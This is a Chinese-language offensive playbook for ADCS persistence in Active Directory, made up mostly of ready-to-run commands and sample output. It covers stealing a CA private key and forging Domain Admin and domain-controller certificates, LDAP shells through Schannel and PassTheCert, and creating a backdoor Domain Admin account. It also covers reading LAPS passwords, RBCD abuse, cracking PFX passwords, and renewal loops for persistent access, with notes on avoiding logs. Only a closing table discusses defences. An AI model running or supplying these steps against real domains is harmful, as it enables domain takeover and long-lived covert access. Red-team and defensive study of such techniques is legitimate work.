# ADCS 证书持久化技术

## Golden Certificate: CA 私钥盗取与证书伪造

### 概述

Golden Certificate 攻击通过盗取 CA 的私钥，在离线环境下伪造任意用户的证书。这是 ADCS 攻击中最强大的持久化手段。

### 前提条件

- CA 服务器的管理员权限（本地 admin 或 Domain Admin）
- 已知 CA 名称（通过枚举获取）

### 步骤 1: 确认 CA 服务器管理权限

```bash
# 枚举 CA 服务器
netexec ldap DC_IP -u USER -p PASS -M adcs

# 确认对 CA 服务器有管理权限
netexec smb CA_SERVER -u USER -p PASS
# 输出 (Pwn3d!) 表示有管理员权限
```

### 步骤 2: 备份 CA 私钥

```bash
# certipy 远程备份 CA 私钥
certipy ca -backup -u 'admin@DOMAIN' -p 'PASS' \
  -ca CA-NAME -target CA_SERVER -dc-ip DC_IP

# 输出: CA-NAME.pfx (CA 私钥和证书)
```

### 步骤 3: 离线伪造任意用户证书

```bash
# 伪造域管证书（完全离线，无需网络）
certipy forge -ca-pfx CA-NAME.pfx -upn administrator@DOMAIN \
  -subject "CN=Administrator,CN=Users,DC=domain,DC=com"

# 输出: administrator_forged.pfx

# 伪造域控机器账户证书
certipy forge -ca-pfx CA-NAME.pfx -upn 'DC01$@DOMAIN'

# 伪造指定有效期的证书（天数）
certipy forge -ca-pfx CA-NAME.pfx -upn administrator@DOMAIN -validity 3650
```

### 步骤 4: 使用伪造证书认证

```bash
certipy auth -pfx administrator_forged.pfx -dc-ip DC_IP

# 输出:
# [*] Got TGT
# [*] Saved credential cache to 'administrator.ccache'
# [*] Got hash for 'administrator@DOMAIN': aad3b435...
```

### Golden Certificate vs Golden Ticket 对比

| 特性 | Golden Certificate | Golden Ticket |
|------|-------------------|---------------|
| 依赖密钥 | CA 私钥 | krbtgt Hash |
| 密码更改后存活 | 是 | 是 |
| **krbtgt 轮换后存活** | **是** | **否** |
| 有效期 | 可自定义（年级别） | 默认 10 小时 |
| 创建时日志 | 无（完全离线） | 无 |
| 使用时日志 | Event 4768 (PKINIT) | Event 4768 |
| 检测难度 | 高（不在 CA 已签发列表中） | 中 |

> **关键差异**: krbtgt 密码轮换是对抗 Golden Ticket 的标准缓解措施，但对 Golden Certificate 完全无效。只有重新部署 CA 才能消除 Golden Certificate 威胁。

---

## Schannel 认证: 绕过 Kerberos 直接 LDAP 认证

### 概述

Schannel 认证使用 TLS 客户端证书直接向 DC 的 LDAP 服务认证，完全绕过 Kerberos。当 PKINIT 不可用（`KDC_ERR_PADATA_TYPE_NOSUPP`）或需要规避 Kerberos 日志时使用。

### 使用 certipy 进入 LDAP Shell

```bash
# 使用证书直接 LDAP 认证
certipy auth -pfx administrator.pfx -ldap-shell -dc-ip DC_IP

# LDAP Shell 中可执行的操作:
# 创建后门用户
add_user backdoor_user P@ssw0rd123

# 添加到 Domain Admins
add_user_to_group backdoor_user "Domain Admins"

# 读取 LAPS 密码
get_laps_password TARGET_COMPUTER

# 修改用户属性
set_rbcd TARGET_COMPUTER ATTACKER_COMPUTER
```

### 使用 PassTheCert

```bash
# 先从 PFX 提取证书和私钥
certipy cert -pfx administrator.pfx -nokey -out user.crt
certipy cert -pfx administrator.pfx -nocert -out user.key

# PassTheCert LDAP Shell
python3 passthecert.py -action ldap-shell \
  -crt user.crt -key user.key \
  -domain DOMAIN -dc-ip DC_IP

# PassTheCert 添加机器账户
python3 passthecert.py -action add-computer \
  -crt user.crt -key user.key \
  -domain DOMAIN -dc-ip DC_IP \
  -computer-name 'EVIL$' -computer-pass 'P@ssw0rd'

# PassTheCert 修改 RBCD
python3 passthecert.py -action write-rbcd \
  -crt user.crt -key user.key \
  -domain DOMAIN -dc-ip DC_IP \
  -delegate-to TARGET_COMPUTER -delegate-from 'EVIL$'
```

### Schannel 认证优势

| 特性 | PKINIT 认证 | Schannel 认证 |
|------|------------|---------------|
| 协议 | Kerberos (88/tcp) | LDAPS (636/tcp) |
| 日志 | Event 4768 | LDAP 操作日志（通常不审计） |
| 产出 | TGT + NTLM Hash | LDAP Shell / 直接操作 |
| 适用场景 | 需要 TGT 票据 | PKINIT 不可用 / 规避检测 |

---

## 证书格式转换

### PFX 与 PEM 互转

```bash
# PFX → PEM（提取证书和私钥）
openssl pkcs12 -in cert.pfx -out cert.pem -nodes
# 密码: 通常为空或 certipy 默认密码

# PFX → 单独提取证书
openssl pkcs12 -in cert.pfx -clcerts -nokeys -out cert.crt

# PFX → 单独提取私钥
openssl pkcs12 -in cert.pfx -nocerts -nodes -out cert.key

# PEM → PFX（合并证书和私钥）
openssl pkcs12 -export -in cert.crt -inkey cert.key -out cert.pfx
# 设置导出密码

# DER → PEM
openssl x509 -inform DER -in cert.der -out cert.pem

# PEM → DER
openssl x509 -outform DER -in cert.pem -out cert.der
```

### 查看证书信息

```bash
# 查看 PFX 证书内容
openssl pkcs12 -in cert.pfx -info -nokeys

# 查看 PEM 证书详情（主体、颁发者、有效期、EKU）
openssl x509 -in cert.pem -text -noout

# 查看证书有效期
openssl x509 -in cert.pem -noout -dates
# notBefore=Apr 23 00:00:00 2025 GMT
# notAfter=Apr 23 00:00:00 2026 GMT
```

### PFX 密码破解

```bash
# 使用 pfx2john 提取 Hash
pfx2john cert.pfx > pfx_hash.txt

# John 破解
john --wordlist=/usr/share/wordlists/rockyou.txt pfx_hash.txt

# Hashcat 破解（mode 22911 = PFX/PKCS#12）
hashcat -m 22911 pfx_hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 证书有效期利用

### 默认有效期

- 大多数模板的默认证书有效期为 **1 年**
- 部分自定义模板可能设置更长有效期（2-5 年）
- CA 根证书有效期通常为 5-10 年

### 检查模板有效期设置

```bash
# certipy 枚举时查看 Validity Period
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -stdout
# 输出中查找:
# Validity Period: 1 year
# Renewal Period: 6 weeks
```

### 证书有效期内的持久化窗口

```
证书签发
  │
  ├── Day 0 ──────────────────────── Day 365
  │   ← 证书有效期（默认 1 年）→
  │
  │   密码更改 ✗ 不影响证书认证
  │   krbtgt 轮换 ✗ 不影响证书认证
  │   账户禁用 ✓ 阻止证书认证
  │   证书吊销 ✓ 如果启用了 CRL 检查
  │
  └── Day 319 ── 续期窗口开始（默认到期前 6 周）
```

### 利用长有效期模板

```bash
# 如果发现有效期较长的模板
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template LONG_VALIDITY_TEMPLATE

# Golden Certificate 可以自定义有效期
certipy forge -ca-pfx CA-NAME.pfx -upn administrator@DOMAIN -validity 3650
# 生成有效期 10 年的证书
```

---

## 证书续期作为持久化机制

### 原理

证书到期前可以使用现有证书进行续期（Renewal），无需用户密码。续期会生成新证书，有效期重新计算。

### 续期条件

- 当前证书仍在有效期内
- 模板允许续期（`Renewal Period` > 0）
- 用户仍有模板的 Enroll 权限

### 续期操作

```bash
# 使用现有证书请求续期
certipy req -u USER@DOMAIN -pfx old_cert.pfx -dc-ip DC_IP \
  -ca CA-NAME -template TEMPLATE_NAME -renew

# Windows 下使用 certreq
certreq -enroll -machine -q -PolicyServer * Renew
```

### 持久化循环

```
初始获取证书（Day 0）
     │
     ├── 有效期 1 年
     │
     └── Day 319: 进入续期窗口
              │
              ├── 使用旧证书续期 → 新证书（有效期再延 1 年）
              │
              └── Day 684: 再次续期...
                       │
                       └── 无限循环（只要模板存在且有权限）
```

### 防御者视角

| 缓解措施 | 是否有效 | 说明 |
|----------|---------|------|
| 更改用户密码 | 否 | 证书认证独立于密码 |
| 轮换 krbtgt | 否 | PKINIT 使用证书而非 krbtgt |
| 禁用用户账户 | 是 | KDC 会拒绝已禁用账户的认证 |
| 吊销证书 | 部分有效 | 依赖 CA 发布 CRL 且客户端检查 CRL |
| 删除模板 | 是 | 阻止续期，但已签发证书仍有效直到过期 |
| 重建 CA | 是 | 唯一能彻底消除 Golden Certificate 的方法 |
